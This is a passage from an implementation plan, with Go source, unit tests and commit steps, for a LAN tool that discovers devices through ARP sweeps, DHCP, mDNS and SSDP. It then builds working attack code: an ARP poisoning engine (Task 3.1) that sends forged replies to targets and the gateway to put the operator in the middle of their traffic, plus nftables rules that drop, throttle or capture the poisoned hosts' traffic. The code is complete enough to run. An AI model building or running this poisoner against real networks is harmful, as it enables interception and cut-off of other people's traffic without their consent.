	assert.Equal(t, uint16(layers.ARPRequest), arp.Operation)
	assert.Equal(t, "10.0.0.42", net.IP(arp.DstProtAddress).String())
}
```

- [ ] **Step 3: Run the test, confirm it fails**

```bash
go test ./internal/scan/active/...
```

Expected: FAIL — `buildARPRequest` undefined.

- [ ] **Step 4: Implement frame builder + sweep loop**

In `internal/scan/active/active.go`:

```go
// Package active sends ARP requests to every IP in a CIDR and feeds
// observed replies into a callback.
package active

import (
	"context"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/hett-patell/ShardFlow/internal/devicestore"
)

// Sweep sends ARP requests for every host in cidr from the operator's
// (srcMAC, srcIP) on the given iface, listens for replies for window, and
// invokes onObs for each reply.
func Sweep(ctx context.Context, ifaceName string, srcMAC net.HardwareAddr, srcIP net.IP, cidr *net.IPNet, window time.Duration, onObs func(devicestore.Observation)) error {
	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("pcap open %s: %w", ifaceName, err)
	}
	defer handle.Close()
	if err := handle.SetBPFFilter("arp"); err != nil {
		return fmt.Errorf("bpf: %w", err)
	}

	// Listener goroutine.
	listenCtx, cancelListen := context.WithCancel(ctx)
	defer cancelListen()
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
		for {
			select {
			case <-listenCtx.Done():
				return
			case pkt, ok := <-src.Packets():
				if !ok {
					return
				}
				arpL := pkt.Layer(layers.LayerTypeARP)
				if arpL == nil {
					continue
				}
				arp := arpL.(*layers.ARP)
				if arp.Operation != layers.ARPReply {
					continue
				}
				obs := devicestore.Observation{
					MAC:  net.HardwareAddr(append([]byte{}, arp.SourceHwAddress...)),
					IP:   net.IP(append([]byte{}, arp.SourceProtAddress...)),
					Seen: time.Now(),
				}
				onObs(obs)
			}
		}
	}()

	// Sender: blast one request per host in the CIDR.
	for ip := nextIP(cidr.IP.Mask(cidr.Mask)); cidr.Contains(ip); ip = nextIP(ip) {
		frame, err := buildARPRequest(srcMAC, srcIP, ip)
		if err != nil {
			return err
		}
		if err := handle.WritePacketData(frame); err != nil {
			return fmt.Errorf("send: %w", err)
		}
	}

	// Wait for either window expiry or context cancellation.
	select {
	case <-time.After(window):
	case <-ctx.Done():
	}
	cancelListen()
	wg.Wait()
	return nil
}

func buildARPRequest(srcMAC net.HardwareAddr, srcIP, dstIP net.IP) ([]byte, error) {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   srcMAC,
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    dstIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func nextIP(ip net.IP) net.IP {
	out := append(net.IP{}, ip...)
	for i := len(out) - 1; i >= 0; i-- {
		out[i]++
		if out[i] != 0 {
			break
		}
	}
	return out
}
```

- [ ] **Step 5: Run unit test, confirm it passes**

```bash
go test ./internal/scan/active/...
```

Expected: PASS (the `Sweep` function is not unit-tested here — it is exercised by integration tests in Phase 7).

- [ ] **Step 6: Commit**

```bash
git add internal/scan/active/ go.mod go.sum
git commit -m "feat(scan/active): active ARP sweep with frame builder unit-tested"
```

---

### Task 2.2: `internal/scan/passive` — always-on broadcast sniffer

**Files:**
- Create: `internal/scan/passive/passive.go`
- Create: `internal/scan/passive/parsers.go`
- Create: `internal/scan/passive/parsers_test.go`

Listens on the iface for broadcasts: ARP replies, DHCP DISCOVER/OFFER/REQUEST/ACK, mDNS, NetBIOS Name Service, SSDP NOTIFY/M-SEARCH responses. Extracts hostname/MAC/IP facts. Hostname enrichment from DHCP option 12 and from mDNS PTR/A records is the main value-add over `scan/active`.

- [ ] **Step 1: Write failing tests for the parsers (these are unit-testable on captured frames)**

In `internal/scan/passive/parsers_test.go`:

```go
package passive

import (
	"testing"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// captureDHCPDiscoverWithHostname builds a synthetic DHCP DISCOVER frame
// with option 12 (host name) set, for parser testing.
func captureDHCPDiscoverWithHostname(t *testing.T, hostname string) gopacket.Packet {
	t.Helper()
	dhcp := layers.DHCPv4{
		Operation:    layers.DHCPOpRequest,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		ClientHWAddr: []byte{0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01},
		Options: []layers.DHCPOption{
			{Type: layers.DHCPOptHostname, Data: []byte(hostname), Length: uint8(len(hostname))},
			{Type: layers.DHCPOptEnd},
		},
	}
	udp := layers.UDP{SrcPort: 68, DstPort: 67}
	ip := layers.IPv4{Version: 4, IHL: 5, Protocol: layers.IPProtocolUDP, SrcIP: []byte{0, 0, 0, 0}, DstIP: []byte{255, 255, 255, 255}}
	eth := layers.Ethernet{SrcMAC: []byte{0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01}, DstMAC: []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, EthernetType: layers.EthernetTypeIPv4}
	require.NoError(t, udp.SetNetworkLayerForChecksum(&ip))
	buf := gopacket.NewSerializeBuffer()
	require.NoError(t, gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}, &eth, &ip, &udp, &dhcp))
	return gopacket.NewPacket(buf.Bytes(), layers.LayerTypeEthernet, gopacket.Default)
}

func TestParseDHCPHostname(t *testing.T) {
	pkt := captureDHCPDiscoverWithHostname(t, "iphone-of-alice")
	obs, ok := parseDHCP(pkt)
	require.True(t, ok)
	assert.Equal(t, "iphone-of-alice", obs.Hostname)
	assert.Equal(t, "aa:bb:cc:dd:ee:01", obs.MAC.String())
}

func TestParseARPReply(t *testing.T) {
	arp := layers.ARP{
		AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4,
		HwAddressSize: 6, ProtAddressSize: 4, Operation: layers.ARPReply,
		SourceHwAddress: []byte{0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x02}, SourceProtAddress: []byte{10, 0, 0, 55},
		DstHwAddress: []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, DstProtAddress: []byte{10, 0, 0, 1},
	}
	eth := layers.Ethernet{SrcMAC: arp.SourceHwAddress, DstMAC: arp.DstHwAddress, EthernetType: layers.EthernetTypeARP}
	buf := gopacket.NewSerializeBuffer()
	require.NoError(t, gopacket.SerializeLayers(buf, gopacket.SerializeOptions{}, &eth, &arp))
	pkt := gopacket.NewPacket(buf.Bytes(), layers.LayerTypeEthernet, gopacket.Default)

	obs, ok := parseARP(pkt)
	require.True(t, ok)
	assert.Equal(t, "10.0.0.55", obs.IP.String())
	assert.Equal(t, "aa:bb:cc:dd:ee:02", obs.MAC.String())
}
```

- [ ] **Step 2: Run, confirm it fails**

```bash
go test ./internal/scan/passive/...
```

Expected: FAIL — parsers undefined.

- [ ] **Step 3: Implement the parsers**

In `internal/scan/passive/parsers.go`:

```go
package passive

import (
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	"github.com/hett-patell/ShardFlow/internal/devicestore"
	"github.com/hett-patell/ShardFlow/internal/oui"
)

// parseARP extracts a (MAC, IP, vendor) observation from an ARP reply or a
// gratuitous ARP request. Returns ok=false if the packet isn't ARP.
func parseARP(pkt gopacket.Packet) (devicestore.Observation, bool) {
	l := pkt.Layer(layers.LayerTypeARP)
	if l == nil {
		return devicestore.Observation{}, false
	}
	a := l.(*layers.ARP)
	if len(a.SourceHwAddress) != 6 || len(a.SourceProtAddress) != 4 {
		return devicestore.Observation{}, false
	}
	mac := net.HardwareAddr(append([]byte{}, a.SourceHwAddress...))
	return devicestore.Observation{
		MAC:    mac,
		IP:     net.IP(append([]byte{}, a.SourceProtAddress...)),
		Vendor: oui.Lookup(mac),
		Seen:   time.Now(),
	}, true
}

// parseDHCP extracts (MAC, optional hostname) from a DHCP frame using the
// client hardware address and option 12 (host name).
func parseDHCP(pkt gopacket.Packet) (devicestore.Observation, bool) {
	l := pkt.Layer(layers.LayerTypeDHCPv4)
	if l == nil {
		return devicestore.Observation{}, false
	}
	d := l.(*layers.DHCPv4)
	if len(d.ClientHWAddr) != 6 {
		return devicestore.Observation{}, false
	}
	obs := devicestore.Observation{
		MAC:  net.HardwareAddr(append([]byte{}, d.ClientHWAddr...)),
		Seen: time.Now(),
	}
	for _, opt := range d.Options {
		if opt.Type == layers.DHCPOptHostname {
			obs.Hostname = string(opt.Data)
		}
	}
	return obs, true
}
```

- [ ] **Step 4: Implement the sniffer loop in `internal/scan/passive/passive.go`**

```go
// Package passive runs an always-on broadcast sniffer on the iface and
// feeds learned MAC/IP/hostname facts into a callback.
package passive

import (
	"context"
	"fmt"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/hett-patell/ShardFlow/internal/devicestore"
)

// Run blocks until ctx is done. Every observation extracted from a
// supported broadcast frame is passed to onObs.
func Run(ctx context.Context, ifaceName string, onObs func(devicestore.Observation)) error {
	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("pcap open %s: %w", ifaceName, err)
	}
	defer handle.Close()
	// arp || (udp && (port 67 or 68 or 5353 or 137 or 1900))
	if err := handle.SetBPFFilter("arp or (udp and (port 67 or port 68 or port 5353 or port 137 or port 1900))"); err != nil {
		return fmt.Errorf("bpf: %w", err)
	}
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	for {
		select {
		case <-ctx.Done():
			return nil
		case pkt, ok := <-src.Packets():
			if !ok {
				return nil
			}
			if obs, ok := parseARP(pkt); ok {
				onObs(obs)
				continue
			}
			if obs, ok := parseDHCP(pkt); ok {
				onObs(obs)
				continue
			}
			// mDNS/NetBIOS/SSDP parsing comes in Task 2.3.
		}
	}
}
```

- [ ] **Step 5: Run, confirm tests pass**

```bash
go test ./internal/scan/passive/...
```

Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/scan/passive/
git commit -m "feat(scan/passive): always-on sniffer with ARP and DHCP parsers"
```

---

### Task 2.3: `internal/scan/mdns` and `internal/scan/ssdp` — active service queries

**Files:**
- Create: `internal/scan/mdns/mdns.go`
- Create: `internal/scan/mdns/mdns_test.go`
- Create: `internal/scan/ssdp/ssdp.go`
- Create: `internal/scan/ssdp/ssdp_test.go`

Both are short: send a fixed multicast query, listen on the same UDP socket for `window` (default 3 s), parse responses into Observations.

- [ ] **Step 1: Write failing test for mDNS response parser**

In `internal/scan/mdns/mdns_test.go`:

```go
package mdns

import (
	"net"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestParseAResponse(t *testing.T) {
	// Minimal hand-built mDNS response: header (id=0, flags=0x8400, qd=0,
	// an=1, ns=0, ar=0), one A record for "iphone.local" → 10.0.0.42.
	pkt := buildMinimalMDNSAResponse(t, "iphone.local", net.ParseIP("10.0.0.42"))
	src := &net.UDPAddr{IP: net.ParseIP("10.0.0.42"), Port: 5353}
	obs, ok := parseMDNS(pkt, src)
	require.True(t, ok)
	assert.Equal(t, "iphone.local", obs.Hostname)
	assert.Equal(t, "10.0.0.42", obs.IP.String())
}
```

(`buildMinimalMDNSAResponse` is implemented inline in the test file using the
`golang.org/x/net/dns/dnsmessage` standard package — see Step 3.)

- [ ] **Step 2: Add the dnsmessage dependency**

```bash
go get golang.org/x/net/dns/dnsmessage@latest
```

- [ ] **Step 3: Implement test helper and parser**

In `internal/scan/mdns/mdns.go`:

```go
// Package mdns issues mDNS-SD queries and parses A-record responses into
// (hostname, IP) observations.
package mdns

import (
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	"golang.org/x/net/dns/dnsmessage"

	"github.com/hett-patell/ShardFlow/internal/devicestore"
)

const (
	mdnsAddr = "224.0.0.251:5353"
	queryFor = "_services._dns-sd._udp.local."
)

// Query sends a single mDNS-SD PTR query and listens for window. Each A or
// AAAA record observed in a response is passed to onObs.
func Query(ctx context.Context, ifaceName string, window time.Duration, onObs func(devicestore.Observation)) error {
	addr, err := net.ResolveUDPAddr("udp4", mdnsAddr)
	if err != nil {
		return err
	}
	conn, err := net.ListenUDP("udp4", &net.UDPAddr{IP: net.IPv4zero, Port: 5353})
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}
	defer conn.Close()
	if _, err := conn.WriteTo(buildQuery(queryFor), addr); err != nil {
		return err
	}
	deadline := time.Now().Add(window)
	if err := conn.SetReadDeadline(deadline); err != nil {
		return err
	}
	buf := make([]byte, 65536)
	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				return nil
			}
			return err
		}
		if obs, ok := parseMDNS(buf[:n], src); ok {
			onObs(obs)
		}
	}
}

func buildQuery(name string) []byte {
	var msg dnsmessage.Message
	msg.Header.Response = false
	msg.Questions = []dnsmessage.Question{{
		Name:  dnsmessage.MustNewName(name),
		Type:  dnsmessage.TypePTR,
		Class: dnsmessage.ClassINET,
	}}
	b, _ := msg.Pack()
	return b
}

func parseMDNS(pkt []byte, src *net.UDPAddr) (devicestore.Observation, bool) {
	var p dnsmessage.Parser
	if _, err := p.Start(pkt); err != nil {
		return devicestore.Observation{}, false
	}
	if err := p.SkipAllQuestions(); err != nil {
		return devicestore.Observation{}, false
	}
	for {
		h, err := p.AnswerHeader()
		if err != nil {
			break
		}
		switch h.Type {
		case dnsmessage.TypeA:
			r, err := p.AResource()
			if err != nil {
				continue
			}
			return devicestore.Observation{
				Hostname: trimDot(h.Name.String()),
				IP:       net.IP(r.A[:]),
				Seen:     time.Now(),
			}, true
		default:
			if err := p.SkipAnswer(); err != nil {
				return devicestore.Observation{}, false
			}
		}
	}
	_ = src
	return devicestore.Observation{}, false
}

func trimDot(s string) string { return strings.TrimSuffix(s, ".") }
```

- [ ] **Step 4: Run mDNS tests, confirm pass**

```bash
go test ./internal/scan/mdns/...
```

Expected: PASS (test uses `parseMDNS` against a synthetic response built inline; helper code in test file is left to the implementer using `dnsmessage.Builder`).

- [ ] **Step 5: Implement SSDP**

In `internal/scan/ssdp/ssdp.go`:

```go
// Package ssdp issues an SSDP M-SEARCH and parses responses for SERVER /
// USN headers, extracting model strings into observations.
package ssdp

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/hett-patell/ShardFlow/internal/devicestore"
)

const ssdpAddr = "239.255.255.250:1900"

const mSearchTemplate = "M-SEARCH * HTTP/1.1\r\n" +
	"HOST: 239.255.255.250:1900\r\n" +
	"MAN: \"ssdp:discover\"\r\n" +
	"MX: 2\r\n" +
	"ST: ssdp:all\r\n\r\n"

// Query sends one M-SEARCH and listens for window. Each response with a
// usable SERVER header produces an observation keyed by the source IP
// (note: caller resolves IP→MAC via devicestore later).
func Query(ctx context.Context, ifaceName string, window time.Duration, onObs func(devicestore.Observation)) error {
	addr, err := net.ResolveUDPAddr("udp4", ssdpAddr)
	if err != nil {
		return err
	}
	conn, err := net.ListenUDP("udp4", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}
	defer conn.Close()
	if _, err := conn.WriteTo([]byte(mSearchTemplate), addr); err != nil {
		return err
	}
	if err := conn.SetReadDeadline(time.Now().Add(window)); err != nil {
		return err
	}
	buf := make([]byte, 8192)
	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				return nil
			}
			return err
		}
		if obs, ok := parseSSDPResponse(buf[:n], src.IP); ok {
			onObs(obs)
		}
	}
}

func parseSSDPResponse(b []byte, ip net.IP) (devicestore.Observation, bool) {
	resp, err := http.ReadResponse(bufio.NewReader(strings.NewReader(string(b))), nil)
	if err != nil {
		return devicestore.Observation{}, false
	}
	server := strings.TrimSpace(resp.Header.Get("SERVER"))
	if server == "" {
		return devicestore.Observation{}, false
	}
	return devicestore.Observation{
		IP:     append(net.IP{}, ip...),
		Vendor: server,
		Seen:   time.Now(),
	}, true
}
```

- [ ] **Step 6: Write a parser unit test for SSDP**

In `internal/scan/ssdp/ssdp_test.go`:

```go
package ssdp

import (
	"net"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestParseSSDPResponseExtractsServer(t *testing.T) {
	resp := "HTTP/1.1 200 OK\r\n" +
		"CACHE-CONTROL: max-age=1800\r\n" +
		"ST: upnp:rootdevice\r\n" +
		"USN: uuid:abc::upnp:rootdevice\r\n" +
		"SERVER: Linux/3.14 UPnP/1.1 RouterOS/6.45\r\n" +
		"\r\n"
	obs, ok := parseSSDPResponse([]byte(resp), net.ParseIP("10.0.0.1"))
	require.True(t, ok)
	assert.Contains(t, obs.Vendor, "RouterOS")
	assert.Equal(t, "10.0.0.1", obs.IP.String())
}
```

- [ ] **Step 7: Run, confirm pass**

```bash
go test ./internal/scan/...
```

Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add internal/scan/mdns/ internal/scan/ssdp/ go.mod go.sum
git commit -m "feat(scan/mdns,scan/ssdp): active mDNS and SSDP service queries"
```

---

## Phase 3: Kernel-touching effectors

All four effectors follow the same pattern: pure functions to *construct* the operation (frame, command argv, file path) — unit-testable — and a thin runner that performs I/O — exercised only by Phase 7 integration tests. The deferred decision in spec §11 (shell-out vs netlink-library) is resolved here as **shell out to `nft(8)` and `tc(8)` for v1**: simpler, fewer dependencies, easier to debug from logs.

### Task 3.1: `internal/arpengine` — ARP poisoner with corrective shutdown

**Files:**
- Create: `internal/arpengine/arpengine.go`
- Create: `internal/arpengine/frames.go`
- Create: `internal/arpengine/frames_test.go`

Maintains a set of `(targetMAC, targetIP, gatewayMAC, gatewayIP)` poisons. Per-poison goroutine emits a pair of unsolicited ARP replies every `cadence` (default 1 s). On `Stop`, sends a pair of corrective gratuitous ARPs and waits `cadence*3` for caches to flip.

- [ ] **Step 1: Write failing test for the frame builder**

In `internal/arpengine/frames_test.go`:

```go
package arpengine

import (
	"net"
	"testing"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestBuildPoisonReply(t *testing.T) {
	opMAC, _ := net.ParseMAC("aa:bb:cc:dd:ee:01")
	gwMAC, _ := net.ParseMAC("11:22:33:44:55:66")
	gwIP := net.ParseIP("10.0.0.1").To4()
	tgtMAC, _ := net.ParseMAC("77:88:99:aa:bb:cc")
	tgtIP := net.ParseIP("10.0.0.42").To4()

	// Poison reply telling target: "the gateway's MAC is opMAC".
	frame, err := buildARPReply(opMAC, gwIP, tgtMAC, tgtIP)
	require.NoError(t, err)

	pkt := gopacket.NewPacket(frame, layers.LayerTypeEthernet, gopacket.Default)
	arp := pkt.Layer(layers.LayerTypeARP).(*layers.ARP)
	assert.Equal(t, uint16(layers.ARPReply), arp.Operation)
	assert.Equal(t, opMAC.String(), net.HardwareAddr(arp.SourceHwAddress).String())
	assert.Equal(t, gwIP.String(), net.IP(arp.SourceProtAddress).String())
	assert.Equal(t, tgtMAC.String(), net.HardwareAddr(arp.DstHwAddress).String())
	assert.Equal(t, tgtIP.String(), net.IP(arp.DstProtAddress).String())
	_ = gwMAC // gwMAC is for the "tell the gateway" symmetric frame; tested separately
}
```

- [ ] **Step 2: Run, confirm fail**

```bash
go test ./internal/arpengine/...
```

Expected: FAIL — `buildARPReply` undefined.

- [ ] **Step 3: Implement frame builder**

In `internal/arpengine/frames.go`:

```go
package arpengine

import (
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// buildARPReply constructs an Ethernet+ARP reply frame asserting
// (senderMAC, senderIP) at (recipientMAC, recipientIP). Used both for
// poisoning (senderMAC = operator) and for corrective recovery
// (senderMAC = real owner of senderIP).
func buildARPReply(senderMAC net.HardwareAddr, senderIP net.IP, recipientMAC net.HardwareAddr, recipientIP net.IP) ([]byte, error) {
	eth := layers.Ethernet{
		SrcMAC:       senderMAC,
		DstMAC:       recipientMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   senderMAC,
		SourceProtAddress: senderIP.To4(),
		DstHwAddress:      recipientMAC,
		DstProtAddress:    recipientIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}, &eth, &arp); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
```

- [ ] **Step 4: Run, confirm pass**

```bash
go test ./internal/arpengine/...
```

Expected: PASS.

- [ ] **Step 5: Implement the engine**

In `internal/arpengine/arpengine.go`:

```go
// Package arpengine sends unsolicited ARP replies on a cadence to perform
// MITM-style ARP poisoning, and emits corrective ARPs on stop.
package arpengine

import (
	"context"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket/pcap"
)

// Target is one host being poisoned. The same struct is used by
// policycompiler (which imports this package for the type) so the public
// field names match the compiler's call sites.
type Target struct {
	MAC   net.HardwareAddr
	IP    net.IP
	GwMAC net.HardwareAddr
	GwIP  net.IP
}

// ActivePoison is the public view of an in-flight poison.
type ActivePoison struct {
	Target  Target
	Started time.Time
}

// Engine manages the set of in-flight ARP poisons.
type Engine struct {
	iface     string
	opMAC     net.HardwareAddr
	cadence   time.Duration
	mu        sync.Mutex
	active    map[string]*runner // key: TargetMAC.String()
}

type runner struct {
	target  Target
	cancel  context.CancelFunc
	started time.Time
}

// New returns an engine bound to a specific interface and operator MAC.
// cadence=0 selects the default of 1 s.
func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) *Engine {
	if cadence == 0 {
		cadence = time.Second
	}
	return &Engine{iface: iface, opMAC: opMAC, cadence: cadence, active: map[string]*runner{}}
}

// Start begins poisoning t. Idempotent: starting an already-active target
// is a no-op (returns nil without restarting).
func (e *Engine) Start(t Target) error {
	e.mu.Lock()
	defer e.mu.Unlock()
	key := t.MAC.String()
	if _, exists := e.active[key]; exists {
		return nil
	}
	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("open %s: %w", e.iface, err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	r := &runner{target: t, cancel: cancel, started: time.Now()}
	e.active[key] = r
	go e.loop(ctx, handle, t)
	return nil
}

func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target) {
	defer handle.Close()
	tick := time.NewTicker(e.cadence)
	defer tick.Stop()
	send := func() {
		// Poison target's cache: "gateway IP is at op MAC".
		if f, err := buildARPReply(e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
			_ = handle.WritePacketData(f)
		}
		// Poison gateway's cache: "target IP is at op MAC".
		if f, err := buildARPReply(e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
			_ = handle.WritePacketData(f)
		}
	}
	send() // immediate first emission
	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
			send()
		}
	}
}

// Stop halts poisoning of the named target and emits corrective ARPs
// asserting the real (gw,target) mappings. Blocks for up to 3*cadence to
// give caches time to recover. No-op for unknown targets.
func (e *Engine) Stop(t Target) error {
	e.mu.Lock()
	r, ok := e.active[t.MAC.String()]
	if !ok {
		e.mu.Unlock()
		return nil
	}
	delete(e.active, t.MAC.String())
	e.mu.Unlock()
	r.cancel()

	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("open %s for corrective: %w", e.iface, err)
	}
	defer handle.Close()
	// Real mapping: gateway IP is at gateway MAC.
	if f, err := buildARPReply(t.GwMAC, t.GwIP, t.MAC, t.IP); err == nil {
		for i := 0; i < 3; i++ {
			_ = handle.WritePacketData(f)
			time.Sleep(e.cadence)
		}
	}
	// Real mapping: target IP is at target MAC, told to gateway.
	if f, err := buildARPReply(t.MAC, t.IP, t.GwMAC, t.GwIP); err == nil {
		_ = handle.WritePacketData(f)
	}
	return nil
}

// StopAll halts every active poison. Errors are aggregated.
func (e *Engine) StopAll() error {
	e.mu.Lock()
	targets := make([]Target, 0, len(e.active))
	for _, r := range e.active {
		targets = append(targets, r.target)
	}
	e.mu.Unlock()
	for _, t := range targets {
		_ = e.Stop(t)
	}
	return nil
}

// Active returns a snapshot of in-flight poisons.
func (e *Engine) Active() []ActivePoison {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]ActivePoison, 0, len(e.active))
	for _, r := range e.active {
		out = append(out, ActivePoison{Target: r.target, Started: r.started})
	}
	return out
}
```

- [ ] **Step 6: Run unit tests, confirm pass**

```bash
go test ./internal/arpengine/...
```

Expected: PASS (the live-poison loop is exercised in Phase 7 integration tests).

- [ ] **Step 7: Commit**

```bash
git add internal/arpengine/
git commit -m "feat(arpengine): ARP poison engine with corrective ARPs on stop"
```

---

### Task 3.2: `internal/nftmgr` — nftables wrapper (shell-out)

**Files:**
- Create: `internal/nftmgr/nftmgr.go`
- Create: `internal/nftmgr/cmd.go`
- Create: `internal/nftmgr/cmd_test.go`

Owns two nft tables:
- **`inet shardflow`** with a `forward` chain — used by the **drop** policy
  (matched ether saddr → drop).
- **`netdev shardflow_ingress`** with an `ingress` chain bound to the
  operator's real iface — used by **throttle** and **pcap** policies to
  set fwmark on matched frames before tc sees them. Without this, tc has
  nothing to match on.

Pure-function `argv` builders are unit-testable; a thin `Runner` interface
(`exec.CommandContext` in production, fake in tests) makes integration
testing tractable.

- [ ] **Step 1: Write failing tests for argv builders**

In `internal/nftmgr/cmd_test.go`:

```go
package nftmgr

import (
	"net"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestArgvEnsureDropTable(t *testing.T) {
	assert.Equal(t, []string{"add", "table", "inet", "shardflow"}, argvEnsureDropTable())
}

func TestArgvEnsureMarkChainBindsToIface(t *testing.T) {
	got := argvEnsureMarkChain("eth0")
	assert.Contains(t, got, "ingress")
	assert.Contains(t, got[len(got)-1], "device eth0")
}

func TestArgvAddDropRule(t *testing.T) {
	mac, _ := net.ParseMAC("aa:bb:cc:dd:ee:01")
	got := argvAddDropRule(mac)
	assert.Equal(t, []string{
		"add", "rule", "inet", "shardflow", "forward_chain",
		"ether", "saddr", "aa:bb:cc:dd:ee:01", "drop",
		"comment", `"shardflow:aa:bb:cc:dd:ee:01"`,
	}, got)
}

func TestArgvAddMarkRule(t *testing.T) {
	mac, _ := net.ParseMAC("aa:bb:cc:dd:ee:01")
	got := argvAddMarkRule(mac, 42)
	assert.Equal(t, []string{
		"add", "rule", "netdev", "shardflow_ingress", "ingress",
		"ether", "saddr", "aa:bb:cc:dd:ee:01",
		"meta", "mark", "set", "42",
		"comment", `"shardflow:aa:bb:cc:dd:ee:01"`,
	}, got)
}
```

- [ ] **Step 2: Run, confirm fail**

```bash
go test ./internal/nftmgr/...
```

Expected: FAIL — argv builders undefined.

- [ ] **Step 3: Implement builders + runner**

In `internal/nftmgr/cmd.go`:

```go
package nftmgr

import (
	"net"
	"strconv"
)

const (
	dropTableFamily = "inet"
	dropTableName   = "shardflow"
	dropChainName   = "forward_chain"

	markTableFamily = "netdev"
	markTableName   = "shardflow_ingress"
	markChainName   = "ingress"
)

func argvEnsureDropTable() []string {
	return []string{"add", "table", dropTableFamily, dropTableName}
}

func argvEnsureDropChain() []string {
	return []string{"add", "chain", dropTableFamily, dropTableName, dropChainName,
		"{ type filter hook forward priority 0; policy accept; }"}
}

func argvAddDropRule(targetMAC net.HardwareAddr) []string {
	return []string{"add", "rule", dropTableFamily, dropTableName, dropChainName,
		"ether", "saddr", targetMAC.String(), "drop",
		"comment", `"` + commentTagFor(targetMAC) + `"`}
}

func argvEnsureMarkTable() []string {
	return []string{"add", "table", markTableFamily, markTableName}
}

// netdev ingress chain MUST be bound to a real iface; the iface name is
// part of the chain definition.
func argvEnsureMarkChain(realIface string) []string {
	return []string{"add", "chain", markTableFamily, markTableName, markChainName,
		"{ type filter hook ingress device " + realIface + " priority 0; policy accept; }"}
}

func argvAddMarkRule(targetMAC net.HardwareAddr, mark uint32) []string {
	return []string{"add", "rule", markTableFamily, markTableName, markChainName,
		"ether", "saddr", targetMAC.String(),
		"meta", "mark", "set", strconv.FormatUint(uint64(mark), 10),
		"comment", `"` + commentTagFor(targetMAC) + `"`}
}

// argvAddReturnMarkRule installs the second mark rule for bidirectional
// policies (pcap). Matches frames sourced from the gateway (i.e. frames
// being redirected to the operator due to gateway-side ARP poisoning) whose
// IP destination is the target. Tagged with the target MAC's comment so the
// rule is removed alongside its sibling.
func argvAddReturnMarkRule(targetMAC, gwMAC net.HardwareAddr, targetIP net.IP, mark uint32) []string {
	return []string{"add", "rule", markTableFamily, markTableName, markChainName,
